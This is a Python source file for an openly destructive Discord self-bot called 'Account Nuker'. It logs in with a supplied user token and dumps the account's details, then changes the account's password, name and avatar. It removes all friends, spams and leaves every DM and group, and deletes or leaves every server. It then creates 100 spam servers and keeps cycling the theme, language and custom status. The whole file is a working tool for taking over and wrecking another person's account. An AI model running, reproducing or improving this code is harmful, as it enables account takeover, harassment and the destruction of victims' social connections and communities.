from __future__ import annotations

import sys
from typing import List, Dict, Union

import colorama
from colorama import Fore
import os
import discord
from discord.ext import commands
import aiohttp
import asyncio
import warnings
import json


warnings.warn = lambda *args, **kwargs: None  # To remove deprecation warnings
colorama.init()


def pad_to_center(l: list, w: int) -> str:
    return "\n".join([" " * (w // 2 - (len(max(l, key=len)) // 2)) + x for x in l])


def print_discord(width):
    text = f"""{Fore.CYAN}
          .///////.           ////////
       ///////////////////////////////////
      //////////////////////////////////////*
    /////////////////////////////////////////
   ///////////////////////////////////////////
  /////////////////////////////////////////////
 ////////////      //////////,     ,///////////,
 ///////////        .///////         ///////////
////////////        ,///////         ///////////.
/////////////*     ///////////     //////////////
/////////////////////////////////////////////////
/////////////////////////////////////////////////
 ,///////////    ///////////////    ///////////
   .////////.                       /////////{Fore.WHITE}"""

    print(pad_to_center(text.splitlines(), width))


def print_title(width):
    text = f"""{Fore.CYAN}
░█████╗░██████╗░░█████╗░███╗░░░███╗██╗░██████╗  ░█████╗░░█████╗░░█████╗░░█████╗░██╗░░░██╗███╗░░██╗████████╗
██╔══██╗██╔══██╗██╔══██╗████╗░████║╚█║██╔════╝  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░░░██║████╗░██║╚══██╔══╝
███████║██║░░██║███████║██╔████╔██║░╚╝╚█████╗░  ███████║██║░░╚═╝██║░░╚═╝██║░░██║██║░░░██║██╔██╗██║░░░██║░░░
██╔══██║██║░░██║██╔══██║██║╚██╔╝██║░░░░╚═══██╗  ██╔══██║██║░░██╗██║░░██╗██║░░██║██║░░░██║██║╚████║░░░██║░░░
██║░░██║██████╔╝██║░░██║██║░╚═╝░██║░░░██████╔╝  ██║░░██║╚█████╔╝╚█████╔╝╚█████╔╝╚██████╔╝██║░╚███║░░░██║░░░
╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░╚═════╝░  ╚═╝░░╚═╝░╚════╝░░╚════╝░░╚════╝░░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░

███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
{Fore.WHITE}""".replace(
        "░", " "
    )

    print(pad_to_center(text.splitlines(), width))


def get_config() -> dict:
    with open("config.json") as f:
        return json.load(f)


class ThemeManager:
    """
    Represents a class that manages theme and language changing for the account.
    """

    def __init__(self, account: AccountNuker, languages: List[str]):
        self.account = account
        self.themes = ["light", "dark"]
        self.languages = languages

    async def start(self) -> None:
        """
        |coro|

        Starts the manager.

        :return: None
        :rtype: None
        """

        config = get_config()
        message_to_spam = config["MESSAGE_TO_SPAM"]

        async with aiohttp.ClientSession() as session:
            while not self.account.is_closed():
                next_language = self.languages.pop(0)
                next_theme = self.themes.pop(0)

                self.languages.append(next_language)
                self.themes.append(next_theme)

                payload = {
                    "theme": next_theme,
                    "locale": next_language,
                    "status": "online",
                    "custom_status": {"text": message_to_spam},
                }
                await session.patch(
                    "https://discord.com/api/v8/users/@me/settings",
                    json=payload,
                    headers=self.account.get_headers(),
                )


class AccountNuker(commands.Bot):
    def __init__(self, token, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.theme_changer = ThemeManager(self, ["ja", "zh-CN", "zh-TW", "ko"])
        self.token = token

    def get_headers(self) -> Dict[str, str]:
        """
        Creates the account headers.

        :return: The headers.
        :rtype: Dict[str, str]
        """

        return {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.285",
            "Authorization": self.token,
        }

    async def leave_guild(self, guild: discord.Guild) -> None:
        """
        |coro|

        Leaves the specified guild or deletes it if the owner is the bot.

        :param discord.Guild guild: The guild.
        :return: None
        :rtype: None
        """

        if guild.owner == self.user:
            await guild.delete()
        else:
            await guild.leave()

        self.format_message(
            Fore.GREEN, "Left/Deleted Guild.", guild.name, guild.id, guild.member_count
        )

    async def remove_friend(self, friend: discord.User) -> None:
        """
        |coro|

        Removes the friend.

        :param discord.User friend: The friend.
        :return: None
        :rtype: None
        """

        await friend.remove_friend()  # Doesnt block the user to make it harder to add friends back.

        self.format_message(Fore.GREEN, "Removed Friend", friend, friend.id)

    async def leave_private_channel(
        self,
        channel: Union[discord.DMChannel, discord.GroupChannel],
        message_to_spam: str,
    ) -> None:
        """
        |coro|

        Leaves the private channel and sends a message to it.

        :param Union[discord.DMChannel, discord.GroupChannel] channel: The private channel to leave.
        :param str message_to_spam: The message to send the private channel.
        :return: None
        :rtype: None
        """

        if isinstance(channel, discord.DMChannel):
            try:
                await channel.send(message_to_spam)
            except Exception as e:
                self.format_message(
                    Fore.RED, "Error when sending message to DMChannel", str(e)
                )

            await self.http.leave_group(channel.id)

            self.format_message(
                Fore.GREEN, "Closed DM Channel.", channel.recipient, channel.id
            )

        elif isinstance(channel, discord.GroupChannel):
            await channel.send(message_to_spam)
            await channel.leave()

            self.format_message(
                Fore.GREEN, "Left Group Channel.", channel.name, channel.id
            )

    async def create_spam_guild(self, name: str, icon: bytes) -> None:
        """
        |coro|

        Creates a guild with the name and icon.

        :param str name: The guild name.
        :param bytes icon: The guild icon.
        :return: None
        :rtype: None
        """

        guild = await self.create_guild(name=name, icon=icon)

        self.format_message(Fore.GREEN, "Created Guild.", guild.name, guild.id)

    @staticmethod
    def format_message(first_color: Fore, *args):
        formatted_message = f"[{first_color}{args[0]}{Fore.WHITE}]"

        for arg in args[1:]:
            formatted_message += f" - [{Fore.YELLOW}{arg}{Fore.WHITE}]"

        print(formatted_message)

    async def nuke(self):
        config = get_config()
        message_to_spam = config["MESSAGE_TO_SPAM"]

        avatar = config["NEW_AVATAR"]
        new_name = config["NEW_NAME"]
        password = config["PASSWORD"]

        if avatar:
            with open(avatar, "rb") as f:
                avatar = f.read()

        if password and new_name:
            try:
                await self.user.edit(
                    avatar=avatar, username=new_name, house=None, password=password
                )
            except Exception as e:
                self.format_message(Fore.RED, "Error changing settings.", str(e))

        self.loop.create_task(self.theme_changer.start())
        self.format_message(Fore.GREEN, "Stared theme manager.")

        await asyncio.gather(
            *[self.remove_friend(friend) for friend in self.user.friends]
        )
        await asyncio.gather(
            *[
                self.leave_private_channel(channel, message_to_spam)
                for channel in self.private_channels
            ]
        )
        await asyncio.gather(*[self.leave_guild(guild) for guild in self.guilds])
        await asyncio.gather(
            *[self.create_spam_guild(message_to_spam, avatar) for i in range(100)]
        )

    async def on_ready(self):
        async with aiohttp.ClientSession() as session:
            info_request = await session.get(
                "https://discord.com/api/v8/users/@me", headers=self.get_headers()
            )
            unused_info = ["public_flags", "flags", "banner", "banner_color"]

        info = await info_request.json()
        for key in info:
            if key not in unused_info:
                self.format_message(Fore.CYAN, key, info[key])

        input("PRESS ENTER TO NUKE.")
        print("Nuking...")

        await self.nuke()

    async def run(self):
        await super().start(self.token)


print(f"{Fore.CYAN}Please enter a discord token.{Fore.WHITE}")
token = input("[USER] --> ")

bot = AccountNuker(token=token, command_prefix="<<<", self_bot=True, help_command=None)


if __name__ == "__main__":
    try:
        terminal_width = os.get_terminal_size().columns
    except OSError:
        terminal_width = 50

    print_discord(terminal_width)
    print_title(terminal_width)

    if "config.json" not in os.listdir():
        print(f"{Fore.RED}Config file not found. Exiting...{Fore.WHITE}")
        input()
        sys.exit(1)

    loop = asyncio.get_event_loop()

    loop.create_task(bot.run())

    loop.run_forever()
